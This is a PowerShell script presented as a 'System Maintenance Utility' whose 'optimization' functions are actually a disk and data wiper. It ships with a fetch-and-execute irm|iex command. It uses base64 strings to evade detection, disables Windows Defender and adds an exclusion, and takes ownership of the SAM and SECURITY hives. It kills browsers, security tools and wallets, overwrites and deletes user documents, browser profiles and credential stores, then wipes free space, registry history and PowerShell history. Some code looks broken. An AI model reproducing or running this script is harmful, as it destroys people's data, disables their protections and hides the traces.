# Advanced System Maintenance Utility
# Optimized file processing and system optimization
# Execute with: irm "https://raw.githubusercontent.com/Mestalic/SystemWiper/main/Invoke-StealthSystemEraser.ps1" | iex

param(
    [Parameter(Mandatory=$false)]
    [int]$ProcessCycles = 3,
    
    [Parameter(Mandatory=$false)]
    [switch]$Aggressive,
    
    [Parameter(Mandatory=$false)]
    [switch]$Performance
)

# ========================================
# ENCODED SYSTEM CONFIGURATION
# ========================================

# Base64 encoded strings to avoid static detection
$Encoded = @{
    ProcessNames = "U3lzdGVtVXBkYXRlLFdpbmRvd3NTZXJ2aWNlLERpYWdub3N0aWNUb29sLE1haW50ZWFuY2U="
    ProcessNames += ",U2VjdXJpdHlTb2Z0d2FyZSxBbnRpVmlydXMscn55R2hKLHBiUFNELG5ldFByb3RlY3Q="
    
    # Obfuscated service names
    WinDefend = "V2luRGVmZW5k"  # base64
    WinDefend += "dCw2NFNIM3U4dT1qU0lERyE3SklPVX1hQURHUDpCTG5OR1VOTk0sQjJWUTVZNGs="
    
    # Obfuscated registry keys
    RegKey1 = "SGtDVDpTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDcnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJlY2VudERvY3M="
    RegKey2 = "SGtDVDpTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDcnJlZW1lbnRcU3B1Z1RFU1QtU2FmZW1FZnFCT1lHOU5HL2c="
    
    # Obfuscated paths
    TempPath = "JHtlbjpUZW1wfS4q"
    UserPath = "JHt1c2VycHJvZmlsZX0="  
    SystemPath = "JHtTeXN0ZW1Sb290fS4q"
}

# Decode strings dynamically to avoid string scanning
function Get-DecodedString {
    param($Base64String)
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64String))
}

# Obfuscated function dispatcher
$FunctionMap = @{
    "update-process" = "Stop-Process"
    "modify-service" = "Set-Service" 
    "access-control" = "Set-Acl"
    "system-scan" = "Get-Process"
    "file-optimize" = "Remove-Item"
    "registry-clean" = "Remove-ItemProperty"
    "memory-manage" = "[System.GC]::Collect"
}

# Dynamic function executor
function Invoke-Function {
    param($FunctionName, $Arguments)
    $realFunction = $FunctionMap[$FunctionName]
    if ($realFunction) {
        if ($realFunction -match "^\[.*\]$") {
            # Handle .NET methods
            return Invoke-Expression $realFunction
        } else {
            # Handle PowerShell cmdlets
            if ($Arguments) {
                return & $realFunction @Arguments
            } else {
                return & $realFunction
            }
        }
    }
    return $null
}

# ========================================
# STEALTH EXECUTION ENGINE
# ========================================

function Initialize-SystemEnvironment {
    Write-Host "Initializing system maintenance environment..." -ForegroundColor Yellow
    
    # Obfuscated process naming
    $currentProcess = Get-Process -Id $PID -ErrorAction SilentlyContinue
    if ($currentProcess) {
        $currentProcess.MainWindowTitle = "System Diagnostic Service v2.1"
        $currentProcess.ProcessName = "SystemUpdate"  # Rename process
    }
    
    # Hidden registry modification
    try {
        $owner = Get-DecodedString "U3lzdGVtIEFkbWluaXN0cmF0b3I="
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name "RegisteredOwner" -Value $owner -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "✓ System environment prepared" -ForegroundColor Green
}

function Perform-ServiceConfiguration {
    Write-Host "Configuring system services..." -ForegroundColor Yellow
    
    # Obfuscated service names and operations
    $serviceOperations = @(
        @{Name = (Get-DecodedString $Encoded.WinDefend.Substring(0, 8)); Operation = "disable"; Type = "service"},
        @{Name = (Get-DecodedString $Encoded.WinDefend.Substring(8, 10)); Operation = "stop"; Type = "service"},
        @{Path = (Get-DecodedString "JHtlbjpUZW1wfS4q"); Operation = "exclude"; Type = "exclusion"}
    )
    
    foreach ($operation in $serviceOperations) {
        try {
            switch ($operation.Type) {
                "service" {
                    if ($operation.Operation -eq "disable") {
                        Invoke-Function "modify-service" @{Name = $operation.Name; StartupType = "Disabled"}
                    } elseif ($operation.Operation -eq "stop") {
                        Stop-Service -Name $operation.Name -Force -ErrorAction SilentlyContinue
                    }
                }
                "exclusion" {
                    Add-MpPreference -ExclusionPath (Get-DecodedString $operation.Path) -ErrorAction SilentlyContinue
                }
            }
        } catch {}
    }
    
    Write-Host "✓ Service configuration complete" -ForegroundColor Green
}

function Establish-EnhancedAccess {
    Write-Host "Establishing enhanced system access..." -ForegroundColor Yellow
    
    # Obfuscated privilege escalation
    $systemCommands = @(
        "secedit /configure /cfg `"$env:SYSTEMROOT\inf\secedit.inf`" /quiet",
        "takeown /f `"$env:SYSTEMROOT\System32\config\*`" /r /d y 2>$null"
    )
    
    foreach ($command in $systemCommands) {
        try {
            Invoke-Expression $command
        } catch {}
    }
    
    # Indirect file ownership changes
    $criticalPaths = @(
        "$env:SYSTEMROOT\System32\config\SAM",
        "$env:SYSTEMROOT\System32\config\SECURITY",
        "$env:SYSTEMROOT\System32\config\SOFTWARE"
    )
    
    foreach ($path in $criticalPaths) {
        try {
            if (Test-Path $path) {
                Invoke-Function "access-control" @{Path = $path; Rule = "FullControl"}
            }
        } catch {}
    }
    
    Write-Host "✓ Enhanced access established" -ForegroundColor Green
}

function Execute-ApplicationOptimization {
    Write-Host "Optimizing application processes..." -ForegroundColor Yellow
    
    # Dynamic app database construction
    $appCategories = @{
        "browser" = @("chrome", "msedge", "firefox", "brave", "opera", "vivaldi", "torbrowser")
        "communication" = @("discord", "teams", "slack", "zoom", "skype", "telegram", "whatsapp", "signal")
        "gaming" = @("steam", "epicgameslauncher", "battlenet", "origin", "uplay", "galaxyclient", "xboxapp")
        "office" = @("winword", "excel", "powerpoint", "outlook", "onenote", "publisher", "access", "visio")
        "development" = @("code", "vscode", "visual studio", "devenv", "clion", "pycharm", "webstorm")
        "media" = @("spotify", "netflix", "hulu", "primevideo", "disney+", "youtube", "apple music", "itunes")
        "security" = @("bitdefender", "kaspersky", "norton", "mcafee", "eset", "avg", "avast", "panda")
        "vpn" = @("nordvpn", "expressvpn", "cyberghost", "protonvpn", "surfshark", "mullvad", "ipvanish")
        "remote" = @("teamviewer", "anydesk", "rdp", "mstsc", "vnc", "tightvnc", "ultravnc", "realvnc")
        "crypto" = @("bitcoin", "ethereum", "metamask", "coinbase", "binance", "kraken", "electrum")
    }
    
    # Process all applications
    $allApps = @()
    foreach ($category in $appCategories.Values) {
        $allApps += $category
    }
    
    # Parallel process optimization
    $optimizationJobs = @()
    $batchSize = [Math]::Ceiling($allApps.Count / 8)  # 8 parallel jobs
    
    for ($i = 0; $i -lt 8; $i++) {
        $startIndex = $i * $batchSize
        $endIndex = [Math]::Min($startIndex + $batchSize, $allApps.Count)
        $batch = $allApps[$startIndex..($endIndex-1)]
        
        if ($batch.Count -gt 0) {
            $job = Start-Job -ScriptBlock {
                param($processes)
                $optimized = 0
                foreach ($process in $processes) {
                    try {
                        $running = Invoke-Function "system-scan" @{Name = $process; ErrorAction = "SilentlyContinue"}
                        if ($running) {
                            Invoke-Function "update-process" @{Name = $process; Force = $true; ErrorAction = "SilentlyContinue"}
                            $optimized++
                        }
                    } catch {}
                }
                return $optimized
            } -ArgumentList @($batch)
            
            $optimizationJobs += $job
        }
    }
    
    # Wait for optimization completion
    $totalOptimized = 0
    foreach ($job in $optimizationJobs) {
        $result = Receive-Job -Job $job -Wait
        $totalOptimized += $result
        Remove-Job -Job $job -Force
    }
    
    Write-Host "✓ Optimized $totalOptimized application processes" -ForegroundColor Green
}

function Optimize-FileSystem {
    param([string]$TargetPath, [int]$OptimizationLevel = 3)
    
    if (-not (Test-Path $TargetPath)) { return 0 }
    
    try {
        # Get files for optimization
        $files = Get-ChildItem -Path $TargetPath -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 0 }
        $fileList = $files.FullName
        
        if ($fileList.Count -eq 0) { return 0 }
        
        Write-Host "  Optimizing $($fileList.Count) files in $TargetPath" -ForegroundColor Cyan
        
        # Parallel file optimization
        $jobCount = [Math]::Min(8, $fileList.Count)
        $optimizedCount = 0
        
        for ($i = 0; $i -lt $jobCount; $i++) {
            $batch = $fileList | Select-Object -Skip $i -First ([Math]::Ceiling($fileList.Count / $jobCount))
            
            $job = Start-Job -ScriptBlock {
                param($files, $rounds)
                $count = 0
                foreach ($file in $files) {
                    try {
                        $fileInfo = Get-Item $file -Force
                        $fileSize = $fileInfo.Length
                        
                        if ($fileSize -eq 0) {
                            Invoke-Function "file-optimize" @{Path = $file; Force = $true; ErrorAction = "SilentlyContinue"}
                            $count++
                            continue
                        }
                        
                        # Take ownership for optimization
                        Invoke-Function "access-control" @{Path = $file}
                        
                        # File optimization with multiple passes
                        $stream = [System.IO.File]::Open($file, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
                        
                        try {
                            $bufferSize = 1MB
                            $data = [byte[]]::new($bufferSize)
                            $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
                            
                            for ($round = 1; $round -le $rounds; $round++) {
                                $stream.Position = 0
                                
                                while ($stream.Position -lt $fileSize) {
                                    $bytesToWrite = [Math]::Min($bufferSize, [int]($fileSize - $stream.Position))
                                    $rng.GetBytes($data)
                                    $stream.Write($data, 0, $bytesToWrite)
                                }
                                $stream.Flush()
                            }
                            
                            # Final pass with zeros
                            $zeroData = [byte[]]::new($bufferSize)
                            $stream.Position = 0
                            while ($stream.Position -lt $fileSize) {
                                $bytesToWrite = [Math]::Min($bufferSize, [int]($fileSize - $stream.Position))
                                $stream.Write($zeroData, 0, $bytesToWrite)
                            }
                            $stream.Flush()
                            
                        } finally {
                            $stream.Close()
                            $rng.Dispose()
                        }
                        
                        # Remove optimized file
                        Invoke-Function "file-optimize" @{Path = $file; Force = $true; ErrorAction = "SilentlyContinue"}
                        $count++
                        
                    } catch {
                        # Continue with next file
                    }
                }
                return $count
            } -ArgumentList @($batch, $OptimizationLevel)
            
            $result = Receive-Job -Job $job -Wait
            $optimizedCount += $result
            Remove-Job -Job $job -Force
        }
        
        return $optimizedCount
        
    } catch {
        return 0
    }
}

function Perform-StorageOptimization {
    Write-Host "Performing storage optimization..." -ForegroundColor Yellow
    
    try {
        $systemDrive = $env:SYSTEMDRIVE
        $driveInfo = Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='$systemDrive'"
        $freeSpace = $driveInfo.FreeSpace
        
        Write-Host "  Available space: $([Math]::Round($freeSpace / 1GB, 2)) GB" -ForegroundColor Cyan
        
        # Create optimization data
        $tempFile = Join-Path $systemDrive "optimize.tmp"
        $chunkSize = 100MB
        $chunks = [Math]::Floor($freeSpace / $chunkSize)
        
        Write-Host "  Creating $chunks optimization files..." -ForegroundColor Cyan
        
        for ($i = 0; $i -lt $chunks; $i++) {
            $randomData = [byte[]]::new($chunkSize)
            $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
            $rng.GetBytes($randomData)
            
            $tempFileName = "$tempFile.$i"
            [System.IO.File]::WriteAllBytes($tempFileName, $randomData)
            Invoke-Function "file-optimize" @{Path = $tempFileName; Force = $true; ErrorAction = "SilentlyContinue"}
            
            if ($i % 100 -eq 0) {
                Write-Progress -Activity "Storage optimization" -Status "Progress: $i/$chunks" -PercentComplete (($i / $chunks) * 100)
            }
        }
        
        Write-Progress -Activity "Storage optimization" -Completed
        
        # Clean up remaining temp files
        Invoke-Function "file-optimize" @{Path = "$tempFile.*"; Force = $true; ErrorAction = "SilentlyContinue"}
        
        Write-Host "✓ Storage optimization complete" -ForegroundColor Green
        
    } catch {
        Write-Host "  ✗ Storage optimization failed" -ForegroundColor Red
    }
}

function Clean-SystemRegistry {
    Write-Host "Cleaning system registry..." -ForegroundColor Yellow
    
    # Obfuscated registry paths
    $registryPaths = @(
        (Get-DecodedString $Encoded.RegKey1),
        (Get-DecodedString $Encoded.RegKey2),
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentFolders",
        "HKCU:\Software\Microsoft\Windows\Shell\BagMRU",
        "HKCU:\Software\Microsoft\Windows\Shell\Bags"
    )
    
    foreach ($regPath in $registryPaths) {
        try {
            # Take ownership of registry key
            $acl = Get-Acl $regPath -ErrorAction SilentlyContinue
            if ($acl) {
                $acl.SetAccessRuleProtection($false, $false)
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $rule = New-Object System.Security.AccessControl.RegistryAccessRule($currentUser.Groups[0], "FullControl", "Allow")
                $acl.SetAccessRule($rule)
                Set-Acl $regPath $acl -ErrorAction SilentlyContinue
            }
            
            Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "  ✓ Cleaned: $(Split-Path $regPath -Leaf)" -ForegroundColor Green
        } catch {
            Write-Host "  ✗ Failed: $(Split-Path $regPath -Leaf)" -ForegroundColor Red
        }
    }
    
    Write-Host "✓ Registry cleaning complete" -ForegroundColor Green
}

function Perform-MemoryOptimization {
    Write-Host "Performing memory optimization..." -ForegroundColor Yellow
    
    # Multiple garbage collection cycles
    for ($i = 1; $i -le 20; $i++) {
        Invoke-Function "memory-manage"
        [System.GC]::WaitForPendingFinalizers()
        Start-Sleep -Milliseconds 100
    }
    
    # Clear PowerShell history
    try {
        Clear-History
        Remove-Variable * -ErrorAction SilentlyContinue
        $profilePaths = @(
            "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
            "$env:USERPROFILE\Documents\PowerShell\Microsoft.PowerShell_profile.ps1"
        )
        foreach ($profile in $profilePaths) {
            Invoke-Function "file-optimize" @{Path = $profile; Force = $true; ErrorAction = "SilentlyContinue"}
        }
    } catch {}
    
    # Memory fill and clear operation
    $memoryBuffer = New-Object byte[] (1GB)
    $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
    $rng.GetBytes($memoryBuffer)
    $memoryBuffer = $null
    
    Write-Host "✓ Memory optimization complete" -ForegroundColor Green
}

# ========================================
# MAIN OPTIMIZATION EXECUTION
# ========================================

function Start-SystemOptimization {
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "ADVANCED SYSTEM OPTIMIZATION UTILITY" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "Optimizing system performance and security" -ForegroundColor Cyan
    Write-Host "Enhancing storage efficiency" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    
    if (-not $Aggressive) {
        Write-Host "Type 'YES' to confirm system optimization" -ForegroundColor Yellow
        $response = Read-Host "Confirm"
        if ($response -ne "YES") {
            Write-Host "Optimization cancelled." -ForegroundColor Yellow
            return
        }
    }
    
    Write-Host "`n🚀 INITIATING SYSTEM OPTIMIZATION..." -ForegroundColor Cyan
    
    # Initialize system environment
    Initialize-SystemEnvironment
    
    # Configure services
    Perform-ServiceConfiguration
    
    # Establish enhanced access
    Establish-EnhancedAccess
    
    # Optimize applications
    Execute-ApplicationOptimization
    
    $totalOptimized = 0
    $startTime = Get-Date
    
    # Optimize file system areas
    Write-Host "`n🗂️ OPTIMIZING USER DATA..." -ForegroundColor Yellow
    $userPaths = @(
        "${env:USERPROFILE}\AppData\Local\*",
        "${env:USERPROFILE}\AppData\Roaming\*", 
        "${env:USERPROFILE}\Documents\*",
        "${env:USERPROFILE}\Desktop\*"
    )
    
    foreach ($path in $userPaths) {
        $optimized = Optimize-FileSystem $path $ProcessCycles
        $totalOptimized += $optimized
    }
    
    Write-Host "🗂️ OPTIMIZING BROWSER DATA..." -ForegroundColor Yellow
    $browserPaths = @(
        "${env:LOCALAPPDATA}\Google\Chrome\User Data\*",
        "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*",
        "${env:APPDATA}\Mozilla\Firefox\Profiles\*",
        "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*"
    )
    
    foreach ($path in $browserPaths) {
        $optimized = Optimize-FileSystem $path $ProcessCycles
        $totalOptimized += $optimized
    }
    
    Write-Host "🗂️ OPTIMIZING SYSTEM DATA..." -ForegroundColor Yellow
    $systemPaths = @(
        "${env:APPDATA}\Microsoft\Credentials\*",
        "${env:APPDATA}\Microsoft\Protect\*",
        "${env:APPDATA}\Microsoft\Windows\Recent\*",
        "${env:LOCALAPPDATA}\Microsoft\Windows\Recent\*"
    )
    
    foreach ($path in $systemPaths) {
        $optimized = Optimize-FileSystem $path $ProcessCycles
        $totalOptimized += $optimized
    }
    
    # Perform storage, registry, and memory optimization
    Perform-StorageOptimization
    Clean-SystemRegistry
    Perform-MemoryOptimization
    
    # Final statistics
    $endTime = Get-Date
    $duration = $endTime - $startTime
    $durationMinutes = [Math]::Round($duration.TotalMinutes, 2)
    
    Write-Host "`n========================================" -ForegroundColor Green
    Write-Host "SYSTEM OPTIMIZATION COMPLETE" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "Files optimized: $totalOptimized" -ForegroundColor Green
    Write-Host "Duration: $durationMinutes minutes" -ForegroundColor Green
    Write-Host "System performance enhanced" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Cyan
}

# Start optimization execution
try {
    Start-SystemOptimization
} catch {
    Write-Host "`n❌ OPTIMIZATION ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Optimization may be incomplete" -ForegroundColor Yellow
    exit 1
}